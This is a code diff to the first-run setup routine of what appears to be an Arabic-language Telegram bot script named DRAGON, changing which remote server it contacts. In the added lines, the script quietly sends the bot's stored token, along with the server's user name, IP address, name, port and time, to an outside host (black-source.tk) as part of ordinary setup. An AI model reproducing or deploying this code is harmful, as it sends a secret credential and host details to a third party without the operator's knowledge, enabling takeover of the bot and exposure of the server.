@@ -45,7 +45,7 @@ if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
 local SUDOID = io.read():gsub(' ','') 
 if tostring(SUDOID):match('%d+') then
-data,res = https.request("https://api-sofi.ga/SRC-DRAGON/index.php?bn=DRAGON&id="..SUDOID)
+data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=DRAGON&id="..SUDOID)
 if res == 200 then
 getIs = json:decode(data)
 if getIs.Info.info == 'Is_Spam' then
@@ -55,7 +55,8 @@ end
 if getIs.Info.info == 'Ok' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
-https.request('https://api-sofi.ga/SRC-DRAGON/index.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)end 
+local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+end 
 else
 io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end  
